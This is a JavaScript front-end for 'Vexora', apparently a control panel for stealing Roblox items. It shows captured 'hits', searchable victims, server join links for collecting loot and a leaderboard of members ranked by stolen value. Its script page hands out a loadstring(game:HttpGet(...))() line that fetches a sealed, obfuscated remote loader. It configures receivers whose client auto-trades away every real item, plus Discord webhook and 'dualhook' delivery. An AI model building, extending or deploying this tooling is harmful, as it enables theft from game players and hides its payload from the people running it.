import { api, downloadCsv } from './api.js';
import { icon, esc, nf, money, timeAgo, stamp, avatar, toast, copyText } from './ui.js';
import { mountArea, distBars, scene3d } from './charts.js';

const GAME_LABELS = {
  mm2: 'Murder Mystery 2',
  adm: 'Adopt Me',
  baddies: 'Baddies',
  gag2: 'Grow a Garden 2',
  sab: 'Steal a Brainrot',
  other: 'Other game',
};

const head = (title, subtitle, actions = '') => `
  <div class="page-head">
    <div class="titles">
      <div class="eyebrow">Vexora</div>
      <h1>${esc(title)}</h1>
      <p>${esc(subtitle)}</p>
    </div>
    ${actions ? `<div class="actions">${actions}</div>` : ''}
  </div>`;

const statCard = ({ label, value, sub, tone, iconName, spark = [] }) => `
  <div class="stat" style="--tone:${tone}">
    <div class="stat-top">
      <span class="stat-icon">${icon(iconName, 15)}</span>
      <span class="stat-label">${esc(label)}</span>
    </div>
    <div class="stat-value">${value}</div>
    <div class="stat-sub">${sub}</div>
    ${spark.length ? `<div class="spark">${spark.map((v) => `<span style="height:${Math.max(6, Math.round(v))}%"></span>`).join('')}</div>` : ''}
  </div>`;

const gameOptions = (selected = 'all') => ['<option value="all">All games</option>']
  .concat(Object.entries(GAME_LABELS).map(([id, name]) => `<option value="${id}" ${id === selected ? 'selected' : ''}>${esc(name)}</option>`))
  .join('');

const rangeOptions = (selected = 'all') => [
  ['all', 'All time'], ['24h', 'Last 24 hours'], ['7d', 'Last 7 days'], ['14d', 'Last 14 days'],
].map(([v, l]) => `<option value="${v}" ${v === selected ? 'selected' : ''}>${l}</option>`).join('');

const statusBadge = (s) => `<span class="badge ${esc(s)}">${esc(s)}</span>`;
const executorBadge = (x) => (x ? `<span class="badge executor">${icon('cpu', 9)} ${esc(x)}</span>` : '');
const robloxBadge = (x) => (x ? `<span class="badge roblox">${icon('user', 9)} ${esc(x)}</span>` : '');

const joinLink = (url, label = 'Join') => (url
  ? `<a class="btn btn-sm btn-join" href="${esc(url)}" target="_blank" rel="noopener noreferrer">${icon('external', 11)} ${esc(label)}</a>`
  : '<span class="cell-sub">no server</span>');

const joinIcon = (url) => (url
  ? `<a class="feed-join" href="${esc(url)}" target="_blank" rel="noopener noreferrer" title="Join this server">${icon('external', 12)}</a>`
  : '');

const emptyState = (title, hint) => `
  <div class="empty">
    ${icon('radio', 22)}
    <strong>${esc(title)}</strong>
    <span>${esc(hint)}</span>
  </div>`;

const serverCard = (s) => `
  <div class="server-card">
    <div class="server-top">
      <div>
        <div class="name">${esc(s.game_name)}</div>
        <div class="sub">${esc(String(s.server_id).slice(0, 12))}… · ${nf(s.hits)} hits</div>
      </div>
      <div class="right"><span class="badge game">${esc(s.game)}</span></div>
    </div>
    <div class="server-items">
      ${s.items.map((i) => `<span class="item-chip"><b>${esc(i.item)}</b><em>${money(i.value)}</em></span>`).join('')}
    </div>
    <div class="server-foot">
      <span class="meta">${money(s.value)} value · ${timeAgo(s.last_seen)} ago</span>
      <div class="actions">
        ${s.executors.map((e) => `<span class="badge executor">${esc(e)}</span>`).join('')}
        ${joinLink(s.server_url, 'Join server')}
      </div>
    </div>
  </div>`;

/* ============================ overview ============================ */
export async function overview(root, ctx) {
  root.innerHTML = `
    <div class="hero">
      <img class="hero-mark" src="/assets/vexora-emblem.png" alt="" aria-hidden="true" />
      <div class="hero-inner">
        <div class="eyebrow">Vexora · live</div>
        <h1>Everything landing, right now.</h1>
        <p>Hits, the servers they came from and the people behind them — updating the moment they happen.</p>
        <div class="hero-chips" id="hero-chips"></div>
      </div>
    </div>
    <div class="stack">
      <div class="stat-grid" id="stats">
        ${Array.from({ length: 4 }, () => '<div class="stat skeleton" style="height:120px"></div>').join('')}
      </div>
      <div class="grid-2">
        <div class="card">
          <div class="card-head">
            <div><h2>Your activity</h2><p>Your hits over the last 24 hours or 14 days.</p></div>
            <div class="right">
              <div class="seg" id="range-seg">
                <button class="on" data-range="24h">24h</button>
                <button data-range="14d">14d</button>
              </div>
            </div>
          </div>
          <div class="card-body"><div id="chart"></div></div>
        </div>
        <div class="card">
          <div class="card-head"><div><h2>Distribution by game</h2><p>Where your own hits come from.</p></div></div>
          <div class="card-body"><div id="dist"></div></div>
        </div>
      </div>
      <div class="card">
        <div class="card-head">
          <div><h2>Servers holding items</h2><p>Join links for servers with fresh hits.</p></div>
          <div class="right"><a class="btn btn-sm" href="/servers" data-link>All servers ${icon('external', 11)}</a></div>
        </div>
        <div class="card-body" id="server-strip"></div>
      </div>
      <div class="card">
        <div class="card-head">
          <div><h2>Live activity</h2><p>Interactive 3D bar and line graph of live activity.</p></div>
          <div class="right"><span class="badge game" id="beat">syncing…</span></div>
        </div>
        <div class="card-body" id="scene3d"></div>
      </div>
      <div class="grid-2">
        <div class="card">
          <div class="card-head">
            <div><h2>Recent activity</h2><p>New hits land here with the server they came from.</p></div>
            <div class="right"><a class="btn btn-sm" href="/hits" data-link>View all</a></div>
          </div>
          <div class="feed" id="feed"></div>
        </div>
        <div class="card">
          <div class="card-head"><div><h2>Your account</h2><p>Everything tied to your token.</p></div></div>
          <div class="card-body">
            <div class="kv" id="mine"></div>
            <a class="btn btn-primary" style="margin-top:14px;width:100%" href="/script" data-link>Open script config</a>
          </div>
        </div>
      </div>
    </div>`;

  let stats = null;
  let range = '24h';
  const recentHits = [];

  const paintLive = () => {
    const now = Date.now();
    while (recentHits.length && now - recentHits[0] > 60000) recentHits.shift();
    const el = root.querySelector('#live-now');
    if (el) el.innerHTML = `<b>${recentHits.length}</b> in the last minute`;
  };
  const bumpLive = () => { recentHits.push(Date.now()); paintLive(); };
  const liveTimer = setInterval(paintLive, 1000);

  const renderStats = (servers) => {
    const spark = (stats.mine.series24h ?? []).slice(-12).map((p) => p.hits);
    const maxSpark = Math.max(1, ...spark);
    const normalised = spark.map((v) => (v / maxSpark) * 100);
    // a flat line of 1px bars reads as a dashed divider, so only draw it with shape
    const shaped = spark.filter((v) => v > 0).length >= 3 ? normalised : [];
    root.querySelector('#stats').innerHTML = [
      statCard({ label: 'Your hits', value: nf(stats.mine.hits), sub: `<em>${nf(stats.mine.today)}</em> today`, tone: 'var(--accent)', iconName: 'hits', spark: shaped }),
      statCard({ label: 'Your value', value: money(stats.mine.value), sub: 'from your captures', tone: 'var(--success)', iconName: 'coin' }),
      statCard({ label: 'Your servers', value: nf(stats.mine.servers), sub: `${nf(servers.length)} with hits in 24h`, tone: 'var(--info)', iconName: 'radio' }),
      statCard({ label: 'Receivers', value: nf(stats.mine.receivers), sub: stats.webhook_set ? 'webhook connected' : 'webhook not set', tone: 'var(--purple)', iconName: 'users' }),
    ].join('');

    const chips = root.querySelector('#hero-chips');
    if (chips) {
      chips.innerHTML = `
        <span class="hero-chip"><i class="dot-live"></i><b>${nf(stats.mine.hits)}</b> your hits</span>
        <span class="hero-chip"><b>${nf(stats.mine.servers)}</b> your servers</span>
        <span class="hero-chip"><b>${money(stats.mine.value)}</b> your value</span>
        <span class="hero-chip" id="live-now"><b>0</b> in the last minute</span>`;
    }

    root.querySelector('#mine').innerHTML = [
      ['Your hits', nf(stats.mine.hits)],
      ['Today', nf(stats.mine.today)],
      ['Your value', money(stats.mine.value)],
      ['Receivers', nf(stats.mine.receivers)],
      ['Webhook', stats.webhook_set ? 'connected' : 'not set'],
      ['Signed in as', ctx.user.username],
    ].map(([k, v]) => `<div><span>${esc(k)}</span><b>${esc(v)}</b></div>`).join('');
  };

  const renderChart = () => {
    mountArea(root.querySelector('#chart'), range === '24h' ? stats.mine.series24h : stats.mine.series14d);
  };

  const renderFeed = (hits) => {
    const host = root.querySelector('#feed');
    if (!hits.length) {
      host.innerHTML = emptyState('No hits recorded', 'Run your loadstring in-game to start capturing hits.');
      return;
    }
    host.innerHTML = hits.slice(0, 40).map((h) => `
      <div class="feed-row">
        <i class="feed-dot"></i>
        <span class="feed-ava">${avatar(h.user ?? { username: 'unknown' }, 22)}</span>
        <div class="feed-main">
          <b>${esc(h.item)}</b>
          <span class="feed-meta">
            ${esc(h.game_name)} · ${esc(h.user?.username ?? 'you')}
            ${robloxBadge(h.roblox_user)}
            ${executorBadge(h.executor)}
          </span>
        </div>
        ${joinIcon(h.server_url)}
        <span class="feed-val">${money(h.value)}</span>
        <span class="feed-time">${timeAgo(h.created_at)}</span>
      </div>`).join('');
  };

  const [statsRes, feedData, serverRes] = await Promise.all([
    api.stats(),
    api.hits({ page: 1 }),
    api.servers({ hours: 24 }).catch(() => ({ servers: [] })),
  ]);
  stats = statsRes;

  renderStats(serverRes.servers);
  renderChart();
  distBars(root.querySelector('#dist'), stats.mine.games, GAME_LABELS);
  scene3d(root.querySelector('#scene3d'), stats.mine.games, GAME_LABELS);
  renderFeed(feedData.rows.map((h) => ({
    ...h,
    user: { username: ctx.user.username, avatar: ctx.user.avatar },
  })));

  root.querySelector('#server-strip').innerHTML = serverRes.servers.length
    ? `<div class="server-grid">${serverRes.servers.slice(0, 3).map(serverCard).join('')}</div>`
    : `<p class="hint">No server ids reported yet. Run the client script in-game — it sends the job id with every hit.</p>`;

  root.querySelector('#range-seg').addEventListener('click', (e) => {
    const btn = e.target.closest('button[data-range]');
    if (!btn) return;
    range = btn.dataset.range;
    root.querySelectorAll('#range-seg button').forEach((b) => b.classList.toggle('on', b === btn));
    renderChart();
  });

  const off = ctx.bus.on('hit', (hit) => {
    const beat = root.querySelector('#beat');
    if (beat) beat.textContent = `${hit.item} · ${hit.executor ?? 'unknown'}`;
    const feed = root.querySelector('#feed');
    if (!feed) return;
    const row = document.createElement('div');
    row.className = 'feed-row fresh';
    row.innerHTML = `<i class="feed-dot"></i>
      <span class="feed-ava">${avatar(hit.user ?? { username: 'unknown' }, 22)}</span>
      <div class="feed-main"><b>${esc(hit.item)}</b>
        <span class="feed-meta">${esc(hit.game_name)} · ${esc(hit.user?.username ?? 'you')}
        ${robloxBadge(hit.roblox_user)} ${executorBadge(hit.executor)}</span></div>
      ${joinIcon(hit.server_url)}
      <span class="feed-val">${money(hit.value)}</span><span class="feed-time">now</span>`;
    feed.prepend(row);
    bumpLive();
    while (feed.children.length > 40) feed.lastElementChild.remove();
  });

  return () => { off(); clearInterval(liveTimer); };
}

/* ============================ servers ============================ */
export async function servers(root, ctx) {
  root.innerHTML = `${head('Servers', 'Every server the network reported, with the items sitting in it and a direct join link.')}
    <div class="card">
      <div class="toolbar">
        <select class="select" id="game" style="width:auto">${gameOptions()}</select>
        <select class="select" id="hours" style="width:auto">
          <option value="1">Last hour</option>
          <option value="6" selected>Last 6 hours</option>
          <option value="24">Last 24 hours</option>
          <option value="168">Last 7 days</option>
        </select>
        <div class="spacer"></div>
        <span class="badge game" id="count"></span>
        <button class="btn btn-sm" id="refresh">${icon('refresh', 13)} Refresh</button>
      </div>
      <div class="card-body" id="grid"></div>
    </div>`;

  const state = { game: 'all', hours: 6 };

  const load = async () => {
    const grid = root.querySelector('#grid');
    const res = await api.servers(state);
    root.querySelector('#count').textContent = `${res.servers.length} servers`;
    grid.innerHTML = res.servers.length
      ? `<div class="server-grid">${res.servers.map(serverCard).join('')}</div>`
      : emptyState('No servers reported in this window', 'Run the client in-game so hits carry a job id, or widen the timeframe.');
  };

  root.querySelector('#game').addEventListener('change', (e) => { state.game = e.target.value; load(); });
  root.querySelector('#hours').addEventListener('change', (e) => { state.hours = Number(e.target.value); load(); });
  root.querySelector('#refresh').addEventListener('click', () => { load(); toast('Servers refreshed', 'info'); });

  await load();

  const off = ctx.bus.on('hit', () => load());
  return () => off();
}

/* ============================ hits ============================ */
export async function hits(root, ctx) {
  root.innerHTML = `${head('Hits', 'Every hit your loadstring captured — item, roblox user, executor and the server to join.')}
    <div class="card">
      <div class="toolbar">
        <div style="position:relative">
          <input class="input" id="q" placeholder="Search item, victim, user…" style="padding-left:31px;width:230px" />
          <span style="position:absolute;left:9px;top:9px;color:var(--faint)">${icon('search', 14)}</span>
        </div>
        <select class="select" id="game" style="width:auto">${gameOptions()}</select>
        <select class="select" id="range" style="width:auto">${rangeOptions()}</select>
        <div class="spacer"></div>
        <button class="btn btn-sm" id="refresh">${icon('refresh', 13)} Refresh</button>
        <button class="btn btn-sm" id="export">${icon('download', 13)} Export</button>
      </div>
      <div class="table-wrap"><table>
        <thead><tr>
          <th class="sortable" data-sort="item">Item</th>
          <th class="sortable" data-sort="game">Game</th>
          <th>Roblox user</th>
          <th>Executor</th>
          <th>Server</th>
          <th class="num sortable" data-sort="value">Value</th>
          <th>Status</th>
          <th class="sortable" data-sort="recent">Time</th>
        </tr></thead>
        <tbody id="rows"><tr><td colspan="8"><div class="skeleton" style="height:140px"></div></td></tr></tbody>
      </table></div>
      <div class="pager" id="pager"></div>
    </div>`;

  const state = { search: '', game: 'all', range: 'all', sort: 'recent', dir: 'desc', page: 1 };

  const load = async () => {
    const body = root.querySelector('#rows');
    const res = await api.hits(state);
    body.innerHTML = res.rows.length
      ? res.rows.map((h) => `
        <tr>
          <td class="cell-item">${esc(h.item)}</td>
          <td><span class="badge game">${esc(h.game)}</span></td>
          <td>${robloxBadge(h.roblox_user) || '<span class="cell-sub">—</span>'}</td>
          <td>${executorBadge(h.executor) || '<span class="cell-sub">—</span>'}</td>
          <td>${joinLink(h.server_url, 'Join')}</td>
          <td class="num">${money(h.value)}</td>
          <td>${statusBadge(h.status)}</td>
          <td class="cell-sub" title="${esc(stamp(h.created_at))}">${timeAgo(h.created_at)} ago</td>
        </tr>`).join('')
      : `<tr><td colspan="8">${emptyState('No hits recorded for this filter.', 'Try widening the timeframe or clearing the search.')}</td></tr>`;

    root.querySelector('#pager').innerHTML = `
      <span>${nf(res.total)} hits · page ${res.page} of ${res.pages}</span>
      <div class="right">
        <button class="btn btn-sm" data-page="${res.page - 1}" ${res.page <= 1 ? 'disabled' : ''}>Prev</button>
        <button class="btn btn-sm" data-page="${res.page + 1}" ${res.page >= res.pages ? 'disabled' : ''}>Next</button>
      </div>`;
  };

  root.querySelector('#pager').addEventListener('click', (e) => {
    const btn = e.target.closest('[data-page]');
    if (!btn || btn.disabled) return;
    state.page = Number(btn.dataset.page);
    load();
  });

  root.querySelector('#refresh').addEventListener('click', () => { toast('Feed refreshed', 'info'); load(); });
  root.querySelector('#export').addEventListener('click', downloadCsv);

  let timer;
  root.querySelector('#q').addEventListener('input', (e) => {
    state.search = e.target.value;
    state.page = 1;
    clearTimeout(timer);
    timer = setTimeout(load, 220);
  });
  root.querySelector('#game').addEventListener('change', (e) => { state.game = e.target.value; state.page = 1; load(); });
  root.querySelector('#range').addEventListener('change', (e) => { state.range = e.target.value; state.page = 1; load(); });

  root.querySelectorAll('th[data-sort]').forEach((th) => {
    th.addEventListener('click', () => {
      const key = th.dataset.sort;
      if (state.sort === key) state.dir = state.dir === 'desc' ? 'asc' : 'desc';
      else { state.sort = key; state.dir = 'desc'; }
      state.page = 1;
      load();
    });
  });

  await load();
  const off = ctx.bus.on('hit', () => load());
  return () => off();
}

/* ============================ public hits ============================ */
export async function publicHits(root, ctx) {
  root.innerHTML = `${head('Public hits', 'An anonymized stream of hits across every member, with the executor and server each one came from.')}
    <div class="card">
      <div class="card-head">
        <div><h2>Live feed</h2><p>Most recent 300</p></div>
        <div class="right">
          <span class="live" id="live-pill"><i></i> Live</span>
          <button class="btn btn-sm" id="refresh">${icon('refresh', 13)}</button>
        </div>
      </div>
      <div class="feed" style="max-height:none" id="feed"></div>
    </div>`;

  const row = (h) => `
    <div class="feed-row">
      <i class="feed-dot"></i>
      <div class="feed-main">
        <b>${esc(h.item)}</b>
        <span class="feed-meta">
          ${esc(h.game_name)} · ${esc(h.user?.username ?? 'unknown')}
          ${robloxBadge(h.roblox_user)}
          ${executorBadge(h.executor)}
        </span>
      </div>
      ${joinIcon(h.server_url)}
      <span class="badge game">${esc(h.game)}</span>
      <span class="feed-val">${money(h.value)}</span>
      <span class="feed-time">${timeAgo(h.created_at)}</span>
    </div>`;

  const load = async () => {
    const res = await api.publicHits({ page: 1 });
    root.querySelector('#feed').innerHTML = res.rows.length
      ? res.rows.map(row).join('')
      : emptyState('No hits recorded', 'Nothing has been captured yet.');
  };

  root.querySelector('#refresh').addEventListener('click', load);
  await load();

  const off = ctx.bus.on('hit', (hit) => {
    const feed = root.querySelector('#feed');
    if (!feed) return;
    const host = document.createElement('div');
    host.innerHTML = row({ ...hit });
    host.firstElementChild.classList.add('fresh');
    feed.prepend(host.firstElementChild);
    while (feed.children.length > 120) feed.lastElementChild.remove();
  });

  return () => off();
}

/* ============================ leaderboard ============================ */
export async function leaderboard(root, ctx) {
  root.innerHTML = `${head('Leaderboard', 'Filter by game and timeframe to see exactly where you stand against the rest of the network.')}
    <div class="card">
      <div class="toolbar">
        <select class="select" id="game" style="width:auto">${gameOptions()}</select>
        <select class="select" id="range" style="width:auto">${rangeOptions('14d')}</select>
        <div class="spacer"></div>
        <span class="badge game" id="count"></span>
      </div>
      <div class="table-wrap"><table>
        <thead><tr>
          <th style="width:70px">Rank #</th>
          <th>Member</th>
          <th class="num">Hits</th>
          <th class="num">Value</th>
        </tr></thead>
        <tbody id="rows"><tr><td colspan="4"><div class="skeleton" style="height:160px"></div></td></tr></tbody>
      </table></div>
      <div class="pager" id="pager"></div>
    </div>`;

  const state = { game: 'all', range: '14d', page: 1 };
  const medal = (r) => (r === 1 ? '🥇' : r === 2 ? '🥈' : r === 3 ? '🥉' : r);

  const load = async () => {
    const res = await api.leaderboard(state);
    root.querySelector('#rows').innerHTML = res.rows.length
      ? res.rows.map((r) => `
        <tr${r.you ? ' style="background:rgba(234,179,8,0.05)"' : ''}>
          <td class="num" style="font-weight:600">${medal(r.rank)}</td>
          <td>
            <div class="cell-row">
              ${avatar({ username: r.username, avatar: r.avatar }, 22)}
              <span>${esc(r.username)}</span>
              ${r.you ? '<span class="badge you">You</span>' : ''}
              ${r.banned ? '<span class="badge banned">Banned</span>' : ''}
            </div>
          </td>
          <td class="num">${nf(r.hits)}</td>
          <td class="num">${money(r.value)}</td>
        </tr>`).join('')
      : `<tr><td colspan="4">${emptyState('No rankings yet', 'No hits landed in this timeframe.')}</td></tr>`;

    root.querySelector('#count').textContent = `${nf(res.total)} ranked`;
    root.querySelector('#pager').innerHTML = `
      <span>page ${res.page} of ${res.pages}</span>
      <div class="right">
        <button class="btn btn-sm" data-page="${res.page - 1}" ${res.page <= 1 ? 'disabled' : ''}>Prev</button>
        <button class="btn btn-sm" data-page="${res.page + 1}" ${res.page >= res.pages ? 'disabled' : ''}>Next</button>
      </div>`;
  };

  root.querySelector('#pager').addEventListener('click', (e) => {
    const btn = e.target.closest('[data-page]');
    if (!btn || btn.disabled) return;
    state.page = Number(btn.dataset.page);
    load();
  });
  root.querySelector('#game').addEventListener('change', (e) => { state.game = e.target.value; state.page = 1; load(); });
  root.querySelector('#range').addEventListener('change', (e) => { state.range = e.target.value; state.page = 1; load(); });

  await load();
  return () => {};
}

/* ============================ script ============================ */
export async function script(root, ctx) {
  const cfg = await api.config();
  const line = `loadstring(game:HttpGet("${cfg.loadstring_url}"))()`;

  root.innerHTML = `${head('My Script', 'Your loadstring, receivers and delivery are managed from one place.')}
    <div class="stack">
      <div class="card">
        <div class="card-head">
          <div><h2>Your loadstring</h2><p>The single line you paste into your executor.</p></div>
          <div class="right"><button class="btn btn-sm" id="copy-line">${icon('copy', 13)} Copy</button></div>
        </div>
        <div class="card-body">
          <div class="code-block" id="line">${esc(line)}</div>
          <p class="hint" style="margin-top:10px">Reports your roblox username, executor and server id with every hit — so you can join and collect.</p>
        </div>
      </div>

      <div class="grid-2">
        <div class="card">
          <div class="card-head"><div><h2>Configuration</h2><p>Save to apply on your next run.</p></div></div>
          <div class="card-body stack">
            <div class="field">
              <label>Discord webhook</label>
              <input class="input mono" id="webhook" placeholder="${esc(cfg.webhook_mask ?? 'https://discord.com/api/webhooks/...')}" />
              <span class="hint">Every hit is messaged here the moment it lands, with a join link.</span>
            </div>
            <div class="field">
              <label>Dualhook webhook</label>
              <input class="input mono" id="dualhook-url" placeholder="${esc(cfg.dualhook_mask ?? 'second discord webhook (optional)')}" />
              <span class="hint">Second destination, only used while dualhook is on.</span>
            </div>
            <div class="field">
              <label>Receivers</label>
              <div class="chips" id="chips">
                ${cfg.receivers.length
                  ? cfg.receivers.map((r) => `<span class="chip">${esc(r)}<button data-remove="${esc(r)}" aria-label="Remove">${icon('x', 11)}</button></span>`).join('')
                  : '<span class="hint">No receivers yet — add one from the Roblox search.</span>'}
              </div>
              <div style="position:relative;margin-top:6px">
                <input class="input" id="receiver" placeholder="Roblox username" autocomplete="off" />
                <div id="suggest" class="card" style="display:none;position:absolute;left:0;right:0;top:calc(100% + 4px);z-index:20;padding:4px"></div>
              </div>
              <span class="hint">Roblox usernames that receive traded items. When one joins your server, the client opens a trade, offers every real item and confirms its side.</span>
            </div>
            <div class="field">
              <label>Minimum value</label>
              <input class="input" id="min-value" type="number" min="0" step="1" value="${Number(cfg.min_value) || 0}" />
              <span class="hint">Only items above this value trigger a hit.</span>
            </div>
            <label class="switch">
              <input type="checkbox" id="dualhook" ${cfg.dualhook_enabled ? 'checked' : ''} />
              <span class="track"></span>
              <span class="label">Toggle dualhook</span>
            </label>
            <button class="btn btn-primary" id="save">Save config</button>
          </div>
        </div>

        <div class="card">
          <div class="card-head"><div><h2>Delivery</h2><p>Where hits actually go.</p></div></div>
          <div class="card-body">
            <div class="kv">
              <div><span>Webhook</span><b>${cfg.webhook_set ? 'connected' : 'not set'}</b></div>
              <div><span>Dualhook</span><b>${cfg.dualhook_enabled ? 'on' : 'off'}</b></div>
              <div><span>Receivers</span><b>${cfg.receivers.length}</b></div>
              <div><span>Min value</span><b>${money(cfg.min_value)}</b></div>
              <div><span>Deliveries</span><b>${nf(cfg.delivery?.count ?? 0)}</b></div>
              <div><span>Last delivery</span><b>${cfg.delivery?.last_at ? (cfg.delivery.last_ok ? 'ok' : 'failed') : 'never'}</b></div>
            </div>
            ${cfg.delivery?.last_error ? `<p class="hint" style="color:#fda4a4;margin-top:10px">Last error: ${esc(cfg.delivery.last_error)}</p>` : ''}
            <button class="btn" id="test-delivery" style="margin-top:14px;width:100%">Send test hit</button>
            <div class="field" style="margin-top:16px">
              <label>API key</label>
              <div style="display:flex;gap:6px">
                <input class="input mono" value="${esc(cfg.api_key)}" readonly />
                <button class="btn btn-icon" id="copy-key" title="Copy key">${icon('copy', 14)}</button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="card vault">
        <div class="card-head">
          <div class="vault-title">
            <span class="vault-icon">${icon('shield', 17)}</span>
            <div>
              <h2>Source vault</h2>
              <p>The URL serves a sealed loader, not readable Lua.</p>
            </div>
          </div>
          <div class="right">
            <span class="seal-pill">${icon('shield', 11)} sealed</span>
            <button class="btn btn-sm" id="copy-lua">${icon('copy', 13)} Copy loadstring</button>
            ${cfg.can_view_source ? `<button class="btn btn-sm" id="toggle-lua">${icon('eye', 13)} Reveal source</button>` : ''}
          </div>
        </div>
        <div class="card-body">
          <div class="vault-note" id="vault-note">
            <span class="vault-lock">${icon(cfg.can_view_source ? 'eye' : 'eyeOff', 16)}</span>
            <div>
              <strong>${cfg.can_view_source ? 'Admin source view' : 'Loader only'}</strong>
              <span>${cfg.can_view_source
                ? 'Reveal decrypts this account\u2019s Lua here. Members never receive it.'
                : 'Anyone who opens the loadstring URL gets the sealed payload. Only an admin can read the real source here.'}</span>
            </div>
          </div>
          <pre class="code-block vault-src" id="lua-src" hidden></pre>
          <p class="hint" id="lua-hint">server id · executor · roblox name · receiver trades · trade-remote capture · no-gun kick · claim requests.</p>
        </div>
      </div>
    </div>`;

  root.querySelector('#copy-line').addEventListener('click', async () => {
    const ok = await copyText(root.querySelector('#line').textContent);
    toast(ok ? 'Loadstring copied to clipboard' : 'Copy failed', ok ? 'success' : 'error');
  });
  root.querySelector('#copy-key').addEventListener('click', async () => {
    const ok = await copyText(cfg.api_key);
    toast(ok ? 'API key copied' : 'Copy failed', ok ? 'success' : 'error');
  });
  const reveal = root.querySelector('#toggle-lua');
  const pre = root.querySelector('#lua-src');
  if (reveal && pre) {
    reveal.addEventListener('click', async () => {
      if (!pre.hidden) {
        pre.hidden = true;
        reveal.innerHTML = `${icon('eye', 13)} Reveal source`;
        return;
      }
      if (!pre.dataset.loaded) {
        reveal.disabled = true;
        try {
          const res = await api.scriptSource('client');
          pre.textContent = res.source ?? '';
          pre.dataset.loaded = '1';
          root.querySelector('#lua-hint').textContent = `${nf((res.source ?? '').split('\n').length)} lines · unsealed for admin view only.`;
        } catch (err) {
          toast(err.message, 'error');
          reveal.disabled = false;
          return;
        }
        reveal.disabled = false;
      }
      pre.hidden = false;
      reveal.innerHTML = `${icon('eyeOff', 13)} Hide source`;
    });
  }
  root.querySelector('#copy-lua').addEventListener('click', async () => {
    const ok = await copyText(root.querySelector('#line').textContent);
    toast(ok ? 'Loadstring copied' : 'Copy failed', ok ? 'success' : 'error');
  });
  root.querySelector('#test-delivery').addEventListener('click', async (e) => {
    const btn = e.currentTarget;
    btn.disabled = true;
    btn.textContent = 'Sending…';
    try {
      await api.testDelivery();
      toast('Discord accepted the test hit', 'success');
    } catch (err) {
      toast(err.message, 'error');
    } finally {
      btn.disabled = false;
      btn.textContent = 'Send test hit';
    }
  });

  const receivers = [...cfg.receivers];
  const paintChips = () => {
    root.querySelector('#chips').innerHTML = receivers.length
      ? receivers.map((r) => `<span class="chip">${esc(r)}<button data-remove="${esc(r)}" aria-label="Remove">${icon('x', 11)}</button></span>`).join('')
      : '<span class="hint">No receivers yet — add one from the Roblox search.</span>';
  };

  root.querySelector('#chips').addEventListener('click', (e) => {
    const btn = e.target.closest('[data-remove]');
    if (!btn) return;
    const i = receivers.indexOf(btn.dataset.remove);
    if (i > -1) receivers.splice(i, 1);
    paintChips();
  });

  const input = root.querySelector('#receiver');
  const suggest = root.querySelector('#suggest');

  const addReceiver = (name) => {
    const clean = String(name).trim();
    if (!clean) return;
    if (!receivers.includes(clean)) {
      if (receivers.length >= 25) return toast('Receiver limit reached (25)', 'error');
      receivers.push(clean);
      paintChips();
    }
    input.value = '';
    suggest.style.display = 'none';
  };

  let searchTimer;
  input.addEventListener('input', () => {
    clearTimeout(searchTimer);
    const q = input.value.trim();
    if (q.length < 2) { suggest.style.display = 'none'; return; }
    searchTimer = setTimeout(async () => {
      const res = await api.robloxSearch(q).catch(() => ({ users: [] }));
      if (!res.users?.length) { suggest.style.display = 'none'; return; }
      suggest.style.display = 'block';
      suggest.innerHTML = res.users.map((u) => `
        <button class="nav-item" style="padding:6px 8px" data-name="${esc(u.name)}">
          ${icon('user', 13)} ${esc(u.display || u.name)}
        </button>`).join('');
    }, 260);
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') { e.preventDefault(); addReceiver(input.value); }
  });
  suggest.addEventListener('click', (e) => {
    const btn = e.target.closest('[data-name]');
    if (btn) addReceiver(btn.dataset.name);
  });

  root.querySelector('#save').addEventListener('click', async (e) => {
    const btn = e.currentTarget;
    btn.disabled = true;
    try {
      await api.saveConfig({
        webhook: root.querySelector('#webhook').value.trim() || undefined,
        dualhook: root.querySelector('#dualhook-url').value.trim() || undefined,
        receivers,
        dualhook_enabled: root.querySelector('#dualhook').checked,
        min_value: Number(root.querySelector('#min-value').value) || 0,
      });
      toast('Configuration saved.');
    } catch (err) {
      toast(err.message, 'error');
    } finally {
      btn.disabled = false;
    }
  });

  return () => {};
}
